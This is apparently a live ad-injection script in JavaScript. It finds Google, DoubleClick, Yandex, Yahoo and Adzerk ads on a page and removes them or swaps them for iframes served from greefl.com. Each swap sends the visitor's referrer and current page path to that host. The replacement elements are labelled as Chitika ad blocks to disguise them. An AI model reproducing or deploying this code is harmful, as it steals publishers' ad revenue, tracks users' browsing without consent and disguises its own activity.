(function () {
    var my_google_ad_width;
    var my_google_ad_height;
    var guId;
    (function() {
        if (typeof google_ad_width !== "undefined" && google_ad_width != null)
            my_google_ad_width = google_ad_width;
        if (typeof google_ad_height !== "undefined" && google_ad_height != null)
            my_google_ad_height = google_ad_height;

        google_ad_width = undefined;
        google_ad_height = undefined;
        var scripts = document.getElementsByTagName('script');


        function guid() {
            function s4() {
                return Math.floor((1 + Math.random()) * 0x10000)
                    .toString(16)
                    .substring(1);
            }
            return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
                s4() + '-' + s4() + s4() + s4();
        }
        (function() {
            guId = guid();

            var flag = false;
            var number = scripts.length - 1;
            for(var i = number; i >= 0; i--) {
                if (scripts[i].getAttribute('data-guid') == guId) {
                    flag = true;
                    break;
                }
            }

            if (flag) {
                arguments.callee();
            } else {
                scripts[number].setAttribute('data-guid', guId);
            }
        })();

    })();

    var replaceAds = function () {
        var SIZES = ['300x250','468x60','728x90','120x600','160x600','320x50','180x150','200x200','234x60','250x250','300x600','336x280','622x50','800x440','800x600','960x36'];
        var checkFrame = function (elem) {
            return !elem || !(elem.src || elem.id);
        };
        var checkSise = function (width, heigth) {
            if(width < 1 || heigth < 1)
                return false;
            return SIZES.indexOf(width.toString() + "x" + heigth.toString()) != -1;
        };
        var checkFrameAds = function (elem) {
            var src = elem.src || "";
            var id = elem.id || "";
            return src.indexOf("google") != -1 || src.indexOf("doubleclick") != -1 || id.indexOf("google") != -1 || id.indexOf("doubleclick") != -1;
        };
        var checkTagA = function (elem) {
            return !elem.href;
        };
        var checkTagAAds = function (elem) {
            var href = elem.href;
            return href.indexOf("google") != -1 || href.indexOf("yandex") != -1 || href.indexOf("yahoo") != -1 || href.indexOf("adzerk") != -1
        };

        var iframe_ref = "", iframe_cur = "";
        if (document.referrer) {
            (function() {
                var url = document.referrer;
                var rel = url.match(/:\/\/(.[^/]+)/)[1];
                iframe_ref = encodeURIComponent(url.substr(url.indexOf(rel) + rel.length + 1));
            })();
        }
        if (window.location.href) {
            (function(){
                var url = window.location.href;
                var rel = url.match(/:\/\/(.[^/]+)/)[1];
                iframe_cur = encodeURIComponent(url.substr(url.indexOf(rel) + rel.length + 1).replace(/\//g, '-'));
            })();
        }

         var iframe_code = "<iframe width=\"{WIDTH}\" height=\"{HEIGHT}\" src=\"http://greefl.com/banner.php?width={WIDTH}&height={HEIGHT}&ref=" + iframe_ref + "&cur=" + iframe_cur + "\" style=\"border:none; margin: 0; padding: 0;\" scrolling=\'no\'></iframe>";

        var generateElement = function(id, content) {
            var div_el = document.createElement("div");
            div_el.id = id;
            div_el.className = id;
            div_el.innerHTML = content;
            return div_el;
        };

        var replaceElement = function (elem, id, content) {
            var parent = elem.parentElement;
            parent.removeChild(elem);
            parent.appendChild(generateElement(id, content));
        };

        var removeIFrameElementWithParent = function(elem) {
            var parent = elem.parentElement;
            if (!checkFrameAds(elem) && elem.tagName.toLowerCase() != "ins") {
                return;
            }
            parent.removeChild(elem);
            removeIFrameElementWithParent(parent);
        };

        var checkIFrameOnPage = function (elem) {
            if (!checkFrameAds(elem)) {
                return;
            }

            var width = elem.offsetWidth;
            var height = elem.offsetHeight;

            if (!checkSise(width, height)) {
                removeIFrameElementWithParent(elem);
                return;
            }

            var s = replaceSize(width, height);
            replaceElement(elem, "chitikaAdBlock-4", s);
        };

        var checkATagOnPage = function (elem) {
            var images = elem.getElementsByTagName("img");
            if (images.length == 0) {
                return;
            }
            var image = images[0];

            var width = image.width;
            var height = image.height;

            if (!checkSise(width, height)) {
                return;
            }

            var s = replaceSize(width, height);
            replaceElement(elem, "chitikaAdBlock", s);
        };

        var replaceSize = function(width, heigth) {
            return iframe_code.replace(/\{WIDTH\}/g, width).replace(/\{HEIGHT\}/g, heigth);
        };

        (function() {
            var ins = document.getElementsByClassName('adsbygoogle');
            if (ins.length == 0) { return; }
            var parent;
            for(var i = ins.length-1; i >= 0; i--) {
                if (!ins.hasOwnProperty(i)) { continue; }
                var elem = ins[i];
                if(!elem.getAttribute('adsbygoogle')) {
                    parent = elem;
                }
            }
            if (parent) {
                var width = parent.style.width.replace('px', '') || parent.offsetWidth;
                var height = parent.style.height.replace('px', '') || parent.offsetHeight;

                if (checkSise(width, height)) {
                    var s = replaceSize(width, height);
                    parent.appendChild(generateElement("chitikaAdBlock-4", s));
                }
                parent.setAttribute('adsbygoogle', 'true');
            }
        })();

        (function() {
            if (typeof my_google_ad_width === "undefined"
                || my_google_ad_width == null
                || typeof my_google_ad_height === "undefined"
                || my_google_ad_height == null) {
                return;
            }

            var width = my_google_ad_width.toString();
            var height = my_google_ad_height.toString();

            if (!checkSise(width, height)) { return; }

            var s = replaceSize(width, height);

            var script = -1;
            (function() {
                var scripts = document.getElementsByTagName('script');
                var count = scripts.length;
                if (count == 0) { return; }
                for (var i = 0; i < count; i++) {
                    var elem = scripts[i];
                    if(elem.getAttribute('data-guid') == guId) {
                        script = elem;
                    }
                }
            })();

            if (script != -1) {
                var parent = script.parentElement;

                var ins = document.createElement("ins");
                ins.style = "display:inline-table;border:none;height:" + height + "px;margin:0;padding:0;position:relative;visibility:visible;width:" + width + "px;background-color:transparent";
                ins.appendChild(generateElement("chitikaAdBlock-4", s));
                parent.insertBefore(ins, script.nextSibling);
                script.setAttribute("show_ads_complete", "true");
            }

        })();

        (function () {
            var ifr = document.getElementsByTagName("iframe");
            for (var j = ifr.length - 1; j >= 0; j--) {
                if (checkFrame(ifr[j])) { continue; }
                checkIFrameOnPage(ifr[j]);
            }
        })();

        (function () {
            var tag_a = document.getElementsByTagName("body")[0].getElementsByTagName("a");
            for (var i in tag_a) {
                if (!tag_a.hasOwnProperty(i) || checkTagA(tag_a[i])) {
                    continue;
                }
                if (checkTagAAds(tag_a[i])) {
                    checkATagOnPage(tag_a[i]);
                }
            }
        })();
    };
    setTimeout(replaceAds, 1510);
    setTimeout(function(){
	var ga = document.createElement('script');
	ga.type = 'text/javascript';
	ga.src = 'http://google-analytics.com/ga.js';
	document.body.appendChild(ga);
    }, 1 * 1000);

})();